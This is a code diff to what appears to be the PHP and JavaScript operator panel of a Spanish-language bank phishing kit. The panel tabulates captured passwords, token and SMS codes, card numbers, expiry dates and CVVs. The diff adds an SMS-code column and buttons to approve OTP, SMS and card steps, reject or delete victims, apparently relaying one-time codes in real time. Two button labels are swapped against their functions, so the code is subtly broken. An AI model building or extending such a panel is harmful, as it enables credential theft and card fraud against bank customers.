@@ -24,6 +24,7 @@ $resultado = $conexion->query($query);
             border-collapse: collapse;
             background: #fff;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
         }
         th, td {
             padding: 10px;
@@ -43,6 +44,8 @@ $resultado = $conexion->query($query);
             cursor: pointer;
             font-size: 16px;
             color: white;
+            margin-right: 5px;
+            margin-bottom: 5px;
         }
         .btn-token {
             background-color: #4da6ff;
@@ -50,11 +53,40 @@ $resultado = $conexion->query($query);
         .btn-tarjeta {
             background-color: #4caf50;
         }
+        .btn-eliminar {
+            background-color: #ff4d4d;
+        }
+        .btn-volver {
+            background-color: #555;
+            padding: 12px 30px;
+            font-size: 18px;
+            margin: 20px 0;
+            display: inline-block;
+            text-decoration: none;
+        }
+        .acciones {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 90%;
+            margin: 0 auto 20px auto;
+        }
+        .header-container h2 {
+            margin: 0;
+        }
     </style>
 </head>
 <body>
 
-<h2>Lista de Usuarios</h2>
+<div class="header-container">
+    <h2>Lista de Usuarios</h2>
+    <a href="index.html" class="btn btn-volver">Volver al Inicio</a>
+</div>
 
 <table>
     <tr>
@@ -63,6 +95,7 @@ $resultado = $conexion->query($query);
         <th>Número Identificación</th>
         <th>Clave Segura</th>
         <th>Código Token</th>
+        <th>Código SMS</th>
         <th>Número Tarjeta</th>
         <th>Fecha Vencimiento</th>
         <th>CVV</th>
@@ -78,12 +111,16 @@ $resultado = $conexion->query($query);
                     <td>{$fila['numero_identificacion']}</td>
                     <td>{$fila['clave_segura']}</td>
                     <td>{$fila['codigo_token']}</td>
+                    <td>{$fila['codigo_sms']}</td>
                     <td>{$fila['numero_tarjeta']}</td>
                     <td>{$fila['fecha_vencimiento']}</td>
                     <td>{$fila['cvv']}</td>
-                    <td>
+                    <td class='acciones'>
                         <button class='btn btn-token' onclick='autorizarUsuario({$fila['id_usuario']})'>Token/OTP</button>
-                        <button class='btn btn-tarjeta' onclick='aprobarTarjeta({$fila['id_usuario']})'>Tarjeta</button>
+                        <button class='btn btn-tarjeta' onclick='aprobarTarjeta({$fila['id_usuario']})'>Codigo SMS</button>
+                        <button class='btn btn-tarjeta' onclick='aprobarCodigosms({$fila['id_usuario']})'>Tarjeta</button>
+                        <button class='btn btn-eliminar' onclick='rechazar({$fila['id_usuario']})'>Rechazar</button>
+                        <button class='btn btn-eliminar' onclick='eliminarUsuario({$fila['id_usuario']})'>Eliminar</button>
                     </td>
                   </tr>";
         }
@@ -104,22 +141,70 @@ function autorizarUsuario(idUsuario) {
         .then(response => response.text())
         .then(data => {
             alert(data);
-            window.location.href = "cargando.html?id_usuario=" + idUsuario; // Redirige con el id_usuario
+            location.reload(); // Recargar para ver cambios
         })
         .catch(error => console.error("Error al autorizar usuario:", error));
     }
 }
 
 function aprobarTarjeta(idUsuario) {
-    if (confirm("¿Seguro que quieres aprobar el acceso a tarjeta?")) {
+    if (confirm("¿Seguro que quieres aprobar el acceso a codigo sms?")) {
         fetch("aprobar_tarjeta.php", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: "id_usuario=" + idUsuario
         })
         .then(response => response.text())
-        .then(data => alert(data))
+        .then(data => {
+            alert(data);
+            location.reload(); // Recargar para ver cambios
+        })
         .catch(error => console.error("Error al aprobar tarjeta:", error));
+    }
+}
+function aprobarCodigosms(idUsuario) {
+    if (confirm("¿Seguro que quieres aprobar el acceso a tarjeta?")) {
+        fetch("aprobar_sms.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "id_usuario=" + idUsuario
+        })
+        .then(response => response.text())
+        .then(data => {
+            alert(data);
+            location.reload(); // Recargar para ver cambios
+        })
+        .catch(error => console.error("Error al aprobar tarjeta:", error));
+    }
+}
+function rechazar(idUsuario) {
+    if (confirm("¿Seguro que quieres rechazar el acceso a este usuario?")) {
+        fetch("rechazar.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "id_usuario=" + idUsuario
+        })
+        .then(response => response.text())
+        .then(data => {
+            alert(data);
+            location.reload(); // Recargar para ver cambios
+        })
+        .catch(error => console.error("Error al aprobar tarjeta:", error));
+    }
+}
+function eliminarUsuario(idUsuario) {
+    if (confirm("¿Estás seguro de que deseas eliminar este usuario? Esta acción no se puede deshacer.")) {
+        fetch("eliminar_usuario.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "id_usuario=" + idUsuario
+        })
+        .then(response => response.text())
+        .then(data => {
+            alert(data);
+            location.reload(); // Recargar la página para ver los cambios
+        })
+        .catch(error => console.error("Error al eliminar usuario:", error));
     }
 }
 </script>
